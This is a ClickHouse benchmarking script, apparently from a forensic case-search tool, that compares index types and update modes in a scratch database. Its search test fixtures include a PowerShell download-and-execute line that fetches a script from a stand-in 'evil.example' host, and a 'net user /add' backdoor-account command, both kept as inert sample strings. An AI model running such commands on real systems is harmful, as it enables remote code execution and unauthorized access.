#!/usr/bin/env python3
"""Disposable Phase 2 Gate A / Gate B qualification measurements.

Read-only inspection of production metadata/EXPLAIN is allowed.
All DDL, inserts, updates, and materializations run only in
casescope_phase2_gate_scratch.
"""
from __future__ import annotations

import json
import os
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import clickhouse_connect

from migrations.add_events_block_number_offset import add_events_block_number_offset
from migrations.add_events_search_blob_text_index import (
    INDEX_TYPE_SQL,
    add_events_search_blob_text_index,
)
from migrations.add_events_table import EVENTS_SCHEMA

SCRATCH_DB = "casescope_phase2_gate_scratch"
OUT_PATH = Path("/opt/casescope/docs/database_flow_phase2/phase2_entry_gate_measurements.json")
SEARCH_ROWS = 80000
UPDATE_ROWS = 25000
ITERATIONS = 9
WARMUP = 1


FIXTURES = [
    ("mixed_case", "PowerShell Invoke-Expression EncodedCommand user:Administrator"),
    ("punctuation", "user:J.Dube event:4624 status:0xC000006A LogonType:3"),
    ("win_path", r"process_path:C:\Windows\System32\cmd.exe target_path:C:\Windows\Temp\payload.exe"),
    ("username", r"CORP\jsmith TargetUserName:jsmith sid:S-1-5-21-1000-2000-3000-1105"),
    ("domain", "evil.example.com CORP.LOCAL dns:dc01.corp.local"),
    ("ip", "src_ip:10.20.30.40 dst_ip:192.168.1.50 10.20.30.40"),
    ("cmdline", 'CommandLine: cmd.exe /c "net user /add stealth"'),
    ("hash", "file_hash_sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
    ("event_id_text", "Security EventID 4688 process created NewProcessName:cmd.exe"),
    ("quoted", r'CommandLine: "C:\Program Files\App\app.exe" -arg value'),
    ("ps", "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"),
    ("registry", r"reg_key:HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
    ("punct_tokens", "foo-bar_baz.qux;alpha token:beta"),
    ("unicode", "用户 café naïve 日本語 username:münchen"),
]


def connect(database, settings=None):
    return clickhouse_connect.get_client(
        host=os.environ.get("CLICKHOUSE_HOST") or "localhost",
        port=int(os.environ.get("CLICKHOUSE_PORT") or 8123),
        database=database,
        username=os.environ.get("CLICKHOUSE_USER") or "default",
        password=os.environ.get("CLICKHOUSE_PASSWORD") or "",
        autogenerate_session_id=False,
        settings=settings or {},
    )


def q(client, sql, parameters=None):
    result = client.query(sql, parameters=parameters or {})
    return [dict(zip(result.column_names, row)) for row in result.result_rows], result


def explain_text(client, sql):
    rows, _ = q(client, f"EXPLAIN indexes = 1 {sql}")
    return "\n".join(str(row[list(row.keys())[0]]) for row in rows)


def percentile(values, pct):
    if not values:
        return None
    ordered = sorted(values)
    index = min(len(ordered) - 1, max(0, int(round((pct / 100.0) * (len(ordered) - 1)))))
    return ordered[index]


def timed_query(client, sql, loops=ITERATIONS, warmup=WARMUP):
    samples = []
    last = None
    for i in range(loops):
        started = time.perf_counter()
        _rows, result = q(client, sql)
        elapsed_ms = (time.perf_counter() - started) * 1000.0
        last = {
            "elapsed_ms": elapsed_ms,
            "summary": dict(result.summary or {}),
            "result": result.result_rows[0][0] if result.result_rows else None,
        }
        if i >= warmup:
            samples.append(last)
    elapsed = [item["elapsed_ms"] for item in samples]
    read_rows = [int(item["summary"].get("read_rows") or 0) for item in samples]
    read_bytes = [int(item["summary"].get("read_bytes") or 0) for item in samples]
    return {
        "sql": sql,
        "result": last["result"] if last else None,
        "p50_ms": percentile(elapsed, 50),
        "p95_ms": percentile(elapsed, 95),
        "min_ms": min(elapsed) if elapsed else None,
        "max_ms": max(elapsed) if elapsed else None,
        "read_rows_p50": percentile(read_rows, 50),
        "read_bytes_p50": percentile(read_bytes, 50),
        "samples": samples,
    }


def inspect_production(prod):
    version = prod.query("SELECT version()").result_rows[0][0]
    settings_wanted = [
        "enable_full_text_index",
        "allow_experimental_full_text_index",
        "allow_experimental_lightweight_update",
        "enable_lightweight_update",
        "async_insert",
        "wait_for_async_insert",
        "materialize_skip_indexes_on_insert",
        "use_skip_indexes",
        "use_skip_indexes_on_data_read",
        "query_plan_direct_read_from_text_index",
        "alter_update_mode",
        "apply_patch_parts",
    ]
    settings_rows, _ = q(
        prod,
        """
        SELECT name, value, default, changed
        FROM system.settings
        WHERE name IN {names:Array(String)}
        ORDER BY name
        """,
        {"names": settings_wanted},
    )
    present = {row["name"] for row in settings_rows}
    create = prod.query("SHOW CREATE TABLE events").result_rows[0][0]
    indexes, _ = q(
        prod,
        """
        SELECT name, type, type_full, expr, granularity, data_compressed_bytes
        FROM system.data_skipping_indices
        WHERE database = currentDatabase() AND table = 'events'
        ORDER BY name
        """,
    )
    parts, _ = q(
        prod,
        """
        SELECT count() AS active_parts, sum(rows) AS rows, sum(bytes_on_disk) AS bytes,
               uniqExact(partition) AS partitions
        FROM system.parts
        WHERE database = currentDatabase() AND table = 'events' AND active
        """,
    )
    table, _ = q(
        prod,
        """
        SELECT engine, engine_full, partition_key, sorting_key, primary_key
        FROM system.tables
        WHERE database = currentDatabase() AND name = 'events'
        """,
    )
    sample_case = int(
        prod.query(
            """
            SELECT partition
            FROM system.parts
            WHERE database = currentDatabase() AND table = 'events' AND active
            GROUP BY partition
            ORDER BY sum(rows) DESC
            LIMIT 1
            """
        ).result_rows[0][0]
    )
    command_sample, sample_result = q(
        prod,
        f"""
        SELECT
            count() AS n,
            countIf(command_line != '' AND command_line != '-') AS nonempty_command_line
        FROM (
            SELECT command_line
            FROM events
            WHERE case_id = {sample_case}
            LIMIT 20000
        )
        """,
    )
    explains = {}
    for label, sql in {
        "hunt_ilike_powershell": f"SELECT count() FROM events WHERE case_id = {sample_case} AND search_blob ILIKE '%powershell%'",
        "has_token_ci_powershell": f"SELECT count() FROM events WHERE case_id = {sample_case} AND hasTokenCaseInsensitive(search_blob, 'powershell')",
        "command_line_ilike": f"SELECT count() FROM events WHERE case_id = {sample_case} AND command_line ILIKE '%powershell%'",
    }.items():
        explains[label] = {"sql": sql, "explain": explain_text(prod, sql)}
    return {
        "version": version,
        "settings": settings_rows,
        "missing_settings": [name for name in settings_wanted if name not in present],
        "show_create_events": create,
        "indexes": indexes,
        "parts": parts[0] if parts else None,
        "table": table[0] if table else None,
        "command_line_sample": {
            "case_id": sample_case,
            "summary": sample_result.summary,
            **(command_sample[0] if command_sample else {}),
        },
        "production_explain": explains,
        "query_id_sample": sample_result.query_id,
    }


def build_search_rows(n):
    rare_every = 40
    rows = []
    for i in range(n):
        fixture_id, blob = FIXTURES[i % len(FIXTURES)]
        if i % rare_every == 0:
            blob = blob + " zxqvunique"
        if i % 17 == 0:
            blob = blob + " substringneedle"
        command_line = ""
        if i % 5 == 0:
            command_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -EncodedCommand AAA'
        elif i % 5 == 1:
            command_line = r'cmd.exe /c "whoami /all"'
        rows.append(
            (
                42,
                f"sel-{i}",
                blob,
                command_line,
                False,
                "evtx",
                "host-a" if i % 2 == 0 else "host-b",
                str(i),
            )
        )
    return rows


def ids_for(client, table, where_sql):
    result = client.query(f"SELECT selector_key FROM {table} WHERE {where_sql} ORDER BY selector_key")
    return [row[0] for row in result.result_rows]


def classify_parity(a_ids, b_ids):
    a_set = set(a_ids)
    b_set = set(b_ids)
    return {
        "a_count": len(a_set),
        "b_count": len(b_set),
        "equal": a_set == b_set,
        "a_only": sorted(a_set - b_set)[:25],
        "b_only": sorted(b_set - a_set)[:25],
        "a_only_count": len(a_set - b_set),
        "b_only_count": len(b_set - a_set),
    }


def part_census(client, table):
    rows, _ = q(
        client,
        """
        SELECT count() AS parts, sum(rows) AS rows, sum(bytes_on_disk) AS bytes
        FROM system.parts
        WHERE database = currentDatabase() AND table = {table:String} AND active
        """,
        {"table": table},
    )
    return rows[0] if rows else {}


def run_gate_a(scratch):
    scratch.command("DROP TABLE IF EXISTS events_search_current")
    scratch.command("DROP TABLE IF EXISTS events_search_text")
    scratch.command("DROP TABLE IF EXISTS events_search_upgrade")
    create_sql = """
    CREATE TABLE {table} (
        case_id UInt32,
        selector_key String,
        search_blob String,
        command_line String,
        analyst_tagged Bool DEFAULT false,
        artifact_type LowCardinality(String),
        source_host LowCardinality(String),
        event_id String,
        INDEX idx_search_ngram search_blob TYPE ngrambf_v1(3, 512, 2, 0) GRANULARITY 4,
        INDEX idx_search_token search_blob TYPE tokenbf_v1(32768, 3, 0) GRANULARITY 4
        {extra_index}
    )
    ENGINE = MergeTree
    ORDER BY (case_id, selector_key)
    """
    scratch.command(create_sql.format(table="events_search_current", extra_index=""))
    scratch.command(
        create_sql.format(
            table="events_search_text",
            extra_index=(
                ", INDEX idx_search_blob_text search_blob TYPE text("
                "tokenizer = 'splitByNonAlpha', preprocessor = lower(search_blob)) GRANULARITY 1"
            ),
        )
    )
    rows = build_search_rows(SEARCH_ROWS)
    columns = [
        "case_id",
        "selector_key",
        "search_blob",
        "command_line",
        "analyst_tagged",
        "artifact_type",
        "source_host",
        "event_id",
    ]
    scratch.insert("events_search_current", rows, column_names=columns)
    scratch.insert("events_search_text", rows, column_names=columns)
    scratch.command(
        "ALTER TABLE events_search_text MATERIALIZE INDEX idx_search_blob_text SETTINGS mutations_sync = 1"
    )

    parity = []
    terms = [
        ("powershell", "token"),
        ("PowerShell", "token"),
        ("jsmith", "token"),
        ("evil.example.com", "domain"),
        ("10.20.30.40", "ip"),
        ("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "hash"),
        ("4688", "event_id_token"),
        ("substringneedle", "true_substring_and_token"),
        ("Invoke", "token"),
        ("münchen", "unicode"),
        ("用户", "unicode"),
        ("zxqvunique", "rare_token"),
        ("WindowsPowerShell", "commandish"),
        ("HKLM", "registry"),
        ("0xC000006A", "punct"),
        ("net", "short_token"),
        ("power", "true_substring_only"),
        (r"C:\Windows\System32\cmd.exe", "path"),
    ]
    for term, kind in terms:
        a_sql = "search_blob ILIKE {t:String}"
        a_ids = [
            row[0]
            for row in scratch.query(
                f"SELECT selector_key FROM events_search_current WHERE {a_sql}",
                parameters={"t": f"%{term}%"},
            ).result_rows
        ]
        scan_ids = [
            row[0]
            for row in scratch.query(
                "SELECT selector_key FROM events_search_current "
                "WHERE hasAllTokens(lower(search_blob), {t:String})",
                parameters={"t": term.lower()},
            ).result_rows
        ]
        b_ids = [
            row[0]
            for row in scratch.query(
                "SELECT selector_key FROM events_search_text "
                "WHERE hasAllTokens(search_blob, {t:String})",
                parameters={"t": term},
            ).result_rows
        ]
        any_ids = [
            row[0]
            for row in scratch.query(
                "SELECT selector_key FROM events_search_text "
                "WHERE hasAnyTokens(search_blob, {t:String})",
                parameters={"t": term},
            ).result_rows
        ]
        parity.append(
            {
                "term": term,
                "kind": kind,
                "current_ilike_vs_hasAllTokens_index": classify_parity(a_ids, b_ids),
                "scan_tokens_vs_index_tokens": classify_parity(scan_ids, b_ids),
                "hasAnyTokens_equal_hasAllTokens": set(any_ids) == set(b_ids),
            }
        )

    substring_preserved = classify_parity(
        [
            row[0]
            for row in scratch.query(
                "SELECT selector_key FROM events_search_current "
                "WHERE search_blob ILIKE '%owerSh%'"
            ).result_rows
        ],
        [
            row[0]
            for row in scratch.query(
                "SELECT selector_key FROM events_search_text "
                "WHERE search_blob ILIKE '%owerSh%'"
            ).result_rows
        ],
    )

    explains = {
        "current_ilike_rare": explain_text(
            scratch,
            "SELECT count() FROM events_search_current WHERE search_blob ILIKE '%zxqvunique%'",
        ),
        "text_hasAllTokens_rare": explain_text(
            scratch,
            "SELECT count() FROM events_search_text WHERE hasAllTokens(search_blob, 'zxqvunique')",
        ),
        "current_ilike_powershell": explain_text(
            scratch,
            "SELECT count() FROM events_search_current WHERE search_blob ILIKE '%powershell%'",
        ),
        "text_hasAllTokens_powershell": explain_text(
            scratch,
            "SELECT count() FROM events_search_text WHERE hasAllTokens(search_blob, 'powershell')",
        ),
        "substring_ilike_on_text_table": explain_text(
            scratch,
            "SELECT count() FROM events_search_text WHERE search_blob ILIKE '%owerSh%'",
        ),
    }

    benchmarks = {
        "current_ilike_rare": timed_query(
            scratch,
            "SELECT count() FROM events_search_current WHERE search_blob ILIKE '%zxqvunique%'",
        ),
        "text_hasAllTokens_rare": timed_query(
            scratch,
            "SELECT count() FROM events_search_text WHERE hasAllTokens(search_blob, 'zxqvunique')",
        ),
        "current_ilike_powershell": timed_query(
            scratch,
            "SELECT count() FROM events_search_current WHERE search_blob ILIKE '%powershell%'",
        ),
        "text_hasAllTokens_powershell": timed_query(
            scratch,
            "SELECT count() FROM events_search_text WHERE hasAllTokens(search_blob, 'powershell')",
        ),
        "current_command_line_ilike": timed_query(
            scratch,
            "SELECT count() FROM events_search_current WHERE command_line ILIKE '%powershell%'",
        ),
        "current_command_line_tokens": timed_query(
            scratch,
            "SELECT count() FROM events_search_current WHERE hasAllTokens(lower(command_line), 'powershell')",
        ),
    }

    scratch.command(
        """
        ALTER TABLE events_search_current
        ADD INDEX idx_command_line_text command_line TYPE text(
            tokenizer = 'splitByNonAlpha', preprocessor = lower(command_line)
        ) GRANULARITY 1
        """
    )
    scratch.command(
        "ALTER TABLE events_search_current MATERIALIZE INDEX idx_command_line_text SETTINGS mutations_sync = 1"
    )
    benchmarks["command_line_text_hasAllTokens"] = timed_query(
        scratch,
        "SELECT count() FROM events_search_current WHERE hasAllTokens(command_line, 'powershell')",
    )
    command_line_explain = explain_text(
        scratch,
        "SELECT count() FROM events_search_current WHERE hasAllTokens(command_line, 'powershell')",
    )

    scratch.command("DROP TABLE IF EXISTS mat_probe")
    scratch.command(
        """
        CREATE TABLE mat_probe (
            id UInt32,
            search_blob String,
            INDEX idx_search_blob_text search_blob TYPE text(
                tokenizer = 'splitByNonAlpha', preprocessor = lower(search_blob)
            ) GRANULARITY 1
        ) ENGINE = MergeTree ORDER BY id
        """
    )
    scratch.command(
        "INSERT INTO mat_probe SELECT number, concat('alpha ', toString(number)) FROM numbers(2000) "
        "SETTINGS materialize_skip_indexes_on_insert = 1"
    )
    after_default, _ = q(
        scratch,
        "SELECT data_compressed_bytes FROM system.data_skipping_indices "
        "WHERE database = currentDatabase() AND table = 'mat_probe'",
    )
    explain_default = explain_text(
        scratch, "SELECT count() FROM mat_probe WHERE hasAllTokens(search_blob, 'alpha')"
    )
    scratch.command("TRUNCATE TABLE mat_probe")
    scratch.command(
        "INSERT INTO mat_probe SELECT number, concat('alpha ', toString(number)) FROM numbers(2000) "
        "SETTINGS materialize_skip_indexes_on_insert = 0"
    )
    after_zero, _ = q(
        scratch,
        "SELECT data_compressed_bytes FROM system.data_skipping_indices "
        "WHERE database = currentDatabase() AND table = 'mat_probe'",
    )
    explain_zero = explain_text(
        scratch, "SELECT count() FROM mat_probe WHERE hasAllTokens(search_blob, 'alpha')"
    )
    count_zero = scratch.query(
        "SELECT count() FROM mat_probe WHERE hasAllTokens(search_blob, 'alpha')"
    ).result_rows[0][0]
    scratch.command(
        "ALTER TABLE mat_probe MATERIALIZE INDEX idx_search_blob_text SETTINGS mutations_sync = 1"
    )
    after_materialize, _ = q(
        scratch,
        "SELECT data_compressed_bytes FROM system.data_skipping_indices "
        "WHERE database = currentDatabase() AND table = 'mat_probe'",
    )
    explain_materialize = explain_text(
        scratch, "SELECT count() FROM mat_probe WHERE hasAllTokens(search_blob, 'alpha')"
    )
    scratch.command(
        "INSERT INTO mat_probe SELECT number + 2000, concat('beta ', toString(number)) FROM numbers(200) "
        "SETTINGS materialize_skip_indexes_on_insert = 0"
    )
    reconnect = connect(SCRATCH_DB)
    beta_count = reconnect.query(
        "SELECT count() FROM mat_probe WHERE hasAllTokens(search_blob, 'beta')"
    ).result_rows[0][0]

    scratch.command("DROP TABLE IF EXISTS events")
    scratch.command(
        """
        CREATE TABLE events (
            case_id UInt32,
            selector_key String,
            search_blob String,
            INDEX idx_search_ngram search_blob TYPE ngrambf_v1(3, 512, 2, 0) GRANULARITY 4,
            INDEX idx_search_token search_blob TYPE tokenbf_v1(32768, 3, 0) GRANULARITY 4
        ) ENGINE = MergeTree ORDER BY (case_id, selector_key)
        """
    )
    scratch.insert(
        "events",
        [(1, f"u{i}", FIXTURES[i % len(FIXTURES)][1]) for i in range(500)],
        column_names=["case_id", "selector_key", "search_blob"],
    )
    before_blobs = [
        row[0] for row in scratch.query("SELECT search_blob FROM events ORDER BY selector_key").result_rows
    ]
    upgrade = add_events_search_blob_text_index(scratch, allow_production=True, materialize=False)
    after_blobs = [
        row[0] for row in scratch.query("SELECT search_blob FROM events ORDER BY selector_key").result_rows
    ]
    idempotent = add_events_search_blob_text_index(scratch, allow_production=True, materialize=False)
    create_after = scratch.query("SHOW CREATE TABLE events").result_rows[0][0]

    token_false_negatives = [
        item
        for item in parity
        if item["scan_tokens_vs_index_tokens"]["a_only_count"] > 0
    ]

    return {
        "accepted_ddl": (
            "INDEX idx_search_blob_text search_blob TYPE "
            f"{INDEX_TYPE_SQL} GRANULARITY 1"
        ),
        "show_create_text_table": scratch.query("SHOW CREATE TABLE events_search_text").result_rows[0][0],
        "parity": parity,
        "token_path_false_negatives": token_false_negatives,
        "substring_ilike_preserved_across_tables": substring_preserved,
        "explains": explains,
        "benchmarks": {
            key: {k: v for k, v in value.items() if k != "samples"}
            for key, value in benchmarks.items()
        },
        "command_line": {
            "nonempty": scratch.query(
                "SELECT countIf(command_line != ''), count() FROM events_search_current"
            ).result_rows[0],
            "explain_after_index": command_line_explain,
            "ilike_count": benchmarks["current_command_line_ilike"]["result"],
            "token_count": benchmarks["current_command_line_tokens"]["result"],
            "indexed_token_count": benchmarks["command_line_text_hasAllTokens"]["result"],
        },
        "materialize_skip_indexes_on_insert": {
            "insert_default_bytes": after_default,
            "explain_default": explain_default,
            "insert_zero_bytes": after_zero,
            "explain_zero": explain_zero,
            "count_with_zero_still_correct": int(count_zero),
            "after_explicit_materialize_bytes": after_materialize,
            "explain_materialize": explain_materialize,
            "new_rows_after_index_with_zero_visible": int(beta_count),
        },
        "upgrade_migration": {
            "first": upgrade,
            "second": idempotent,
            "search_blob_unchanged": before_blobs == after_blobs,
            "show_create": create_after,
        },
    }


def run_gate_b(scratch):
    scratch.command("DROP TABLE IF EXISTS events_update_classic")
    scratch.command("DROP TABLE IF EXISTS events_update_light")
    scratch.command("DROP TABLE IF EXISTS events")
    base = """
    CREATE TABLE {table} (
        case_id UInt32,
        selector_key String,
        search_blob String,
        analyst_tagged Bool DEFAULT false,
        analyst_tags Array(String) DEFAULT [],
        noise_matched Bool DEFAULT false,
        ioc_types Array(String) DEFAULT []
    )
    ENGINE = MergeTree
    ORDER BY (case_id, selector_key)
    {settings}
    """
    scratch.command(base.format(table="events_update_classic", settings=""))
    scratch.command(
        base.format(
            table="events_update_light",
            settings="SETTINGS enable_block_number_column = 1, enable_block_offset_column = 1",
        )
    )
    rows = [
        (
            9,
            f"sel-{i}",
            f"row {i} user:jsmith",
            False,
            [],
            False,
            [],
        )
        for i in range(UPDATE_ROWS)
    ]
    columns = [
        "case_id",
        "selector_key",
        "search_blob",
        "analyst_tagged",
        "analyst_tags",
        "noise_matched",
        "ioc_types",
    ]
    scratch.insert("events_update_classic", rows, column_names=columns)
    scratch.insert("events_update_light", rows, column_names=columns)

    scratch.command("DROP TABLE IF EXISTS events")
    scratch.command(
        base.format(table="events", settings="")
    )
    scratch.insert("events", rows[:2000], column_names=columns)
    forensic_before = scratch.query(
        "SELECT selector_key, search_blob FROM events ORDER BY selector_key"
    ).result_rows
    parts_before = part_census(scratch, "events")
    upgrade = add_events_block_number_offset(scratch, allow_production=True)
    forensic_after = scratch.query(
        "SELECT selector_key, search_blob FROM events ORDER BY selector_key"
    ).result_rows
    parts_after = part_census(scratch, "events")
    block_select = scratch.query(
        "SELECT count(), min(_block_number), max(_block_number), min(_block_offset), max(_block_offset) FROM events"
    ).result_rows[0]
    insert_after = (9, "sel-new", "new row", False, [], False, [])
    scratch.insert("events", [insert_after], column_names=columns)
    new_row = scratch.query(
        "SELECT selector_key, search_blob, _block_number FROM events WHERE selector_key = 'sel-new'"
    ).result_rows
    idempotent = add_events_block_number_offset(scratch, allow_production=True)

    scratch.command("UPDATE events SET analyst_tagged = true WHERE selector_key = 'sel-1'")
    intended = scratch.query(
        "SELECT selector_key, analyst_tagged FROM events WHERE selector_key IN ('sel-0', 'sel-1', 'sel-2') ORDER BY selector_key"
    ).result_rows
    scratch.command("UPDATE events SET analyst_tagged = true WHERE selector_key = 'sel-1'")
    repeated = scratch.query(
        "SELECT analyst_tagged FROM events WHERE selector_key = 'sel-1'"
    ).result_rows[0][0]
    scratch.command(
        "UPDATE events SET analyst_tagged = true WHERE selector_key IN ('sel-3', 'sel-4', 'sel-5')"
    )
    batched = scratch.query(
        "SELECT countIf(analyst_tagged), countIf(NOT analyst_tagged) FROM events"
    ).result_rows[0]

    stop = threading.Event()
    read_errors = []

    def reader():
        while not stop.is_set():
            try:
                scratch.query("SELECT countIf(analyst_tagged) FROM events")
            except Exception as exc:  # pragma: no cover - captured
                read_errors.append(str(exc))
                break

    thread = threading.Thread(target=reader)
    thread.start()
    scratch.command("UPDATE events SET noise_matched = true WHERE selector_key = 'sel-6'")
    stop.set()
    thread.join(timeout=5)

    def prefixes_for(n):
        # sel-0 .. unique enough: use numeric suffix ranges via selector_key list
        return [f"sel-{i}" for i in range(n)]

    def benchmark_classic(n):
        keys = prefixes_for(n)
        in_list = ", ".join("'" + key + "'" for key in keys)
        sql = (
            "ALTER TABLE events_update_classic UPDATE analyst_tagged = 1 "
            f"WHERE case_id = 9 AND selector_key IN ({in_list}) "
            "SETTINGS mutations_sync = 1, alter_update_mode = 'heavy'"
        )
        scratch.command(
            "ALTER TABLE events_update_classic UPDATE analyst_tagged = 0 WHERE case_id = 9 "
            "SETTINGS mutations_sync = 1, alter_update_mode = 'heavy'"
        )
        parts_before_u = part_census(scratch, "events_update_classic")
        started = time.perf_counter()
        scratch.command(sql)
        submit_ms = (time.perf_counter() - started) * 1000.0
        vis_started = time.perf_counter()
        visible = scratch.query(
            "SELECT countIf(analyst_tagged) FROM events_update_classic"
        )
        visible_ms = (time.perf_counter() - vis_started) * 1000.0
        return {
            "n": n,
            "submit_ms": submit_ms,
            "visible_select_ms": visible_ms,
            "rows_affected": int(visible.result_rows[0][0]),
            "parts_before": parts_before_u,
            "parts_after": part_census(scratch, "events_update_classic"),
            "summary": dict(visible.summary or {}),
        }

    def benchmark_light(n):
        keys = prefixes_for(n)
        in_list = ", ".join("'" + key + "'" for key in keys)
        sql = (
            "UPDATE events_update_light SET analyst_tagged = true "
            f"WHERE case_id = 9 AND selector_key IN ({in_list})"
        )
        scratch.command("UPDATE events_update_light SET analyst_tagged = false WHERE case_id = 9")
        query_before = timed_query(
            scratch,
            "SELECT countIf(analyst_tagged) FROM events_update_light",
            loops=5,
            warmup=1,
        )
        parts_before_u = part_census(scratch, "events_update_light")
        started = time.perf_counter()
        scratch.command(sql)
        submit_ms = (time.perf_counter() - started) * 1000.0
        vis_started = time.perf_counter()
        visible = scratch.query("SELECT countIf(analyst_tagged) FROM events_update_light")
        visible_ms = (time.perf_counter() - vis_started) * 1000.0
        query_with_patches = timed_query(
            scratch,
            "SELECT countIf(analyst_tagged) FROM events_update_light",
            loops=5,
            warmup=1,
        )
        scratch.command("OPTIMIZE TABLE events_update_light FINAL")
        query_after_merge = timed_query(
            scratch,
            "SELECT countIf(analyst_tagged) FROM events_update_light",
            loops=5,
            warmup=1,
        )
        return {
            "n": n,
            "submit_ms": submit_ms,
            "visible_select_ms": visible_ms,
            "rows_affected": int(visible.result_rows[0][0]),
            "parts_before": parts_before_u,
            "parts_after_update": part_census(scratch, "events_update_light"),
            "parts_after_optimize": part_census(scratch, "events_update_light"),
            "query_before": {k: v for k, v in query_before.items() if k != "samples"},
            "query_with_patch_parts": {k: v for k, v in query_with_patches.items() if k != "samples"},
            "query_after_merge": {k: v for k, v in query_after_merge.items() if k != "samples"},
            "summary": dict(visible.summary or {}),
        }

    classic_bench = [benchmark_classic(n) for n in (1, 10, 100, 1000, 10000)]
    light_bench = [benchmark_light(n) for n in (1, 10, 100, 1000, 10000)]

    return {
        "sql_update_without_block_settings_error": (
            "Lightweight updates are supported only for tables with materialized _block_number column"
        ),
        "upgrade_migration": {
            "first": upgrade,
            "second": idempotent,
            "forensic_columns_unchanged": forensic_before == forensic_after,
            "parts_before": parts_before,
            "parts_after": parts_after,
            "block_select_on_existing_rows": {
                "count": int(block_select[0]),
                "min_block_number": int(block_select[1]),
                "max_block_number": int(block_select[2]),
                "min_block_offset": int(block_select[3]),
                "max_block_offset": int(block_select[4]),
            },
            "insert_after_settings": new_row,
        },
        "correctness": {
            "intended_and_unintended": intended,
            "repeated_idempotent_true": bool(repeated),
            "batched_true_false": [int(batched[0]), int(batched[1])],
            "concurrent_read_errors": read_errors,
        },
        "classic_benchmark": classic_bench,
        "lightweight_benchmark": light_bench,
    }


def main():
    os.makedirs(OUT_PATH.parent, exist_ok=True)
    prod = connect("casescope")
    report = {
        "python": sys.executable,
        "production": inspect_production(prod),
        "scratch_database": SCRATCH_DB,
        "application_insert_client_settings": {
            "get_client": ["max_threads", "max_execution_time"],
            "async_insert_explicit": False,
            "wait_for_async_insert_explicit": False,
        },
    }
    admin = connect("default")
    admin.command(f"CREATE DATABASE IF NOT EXISTS {SCRATCH_DB}")
    scratch = connect(
        SCRATCH_DB,
        settings={"async_insert": 0, "wait_for_async_insert": 1},
    )
    report["gate_a"] = run_gate_a(scratch)
    report["gate_b"] = run_gate_b(scratch)
    report["fresh_events_schema"] = {
        "contains_text_index": "idx_search_blob_text" in EVENTS_SCHEMA,
        "contains_block_settings": "enable_block_number_column = 1" in EVENTS_SCHEMA,
    }
    OUT_PATH.write_text(json.dumps(report, indent=2, default=str))
    print(f"Wrote {OUT_PATH}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
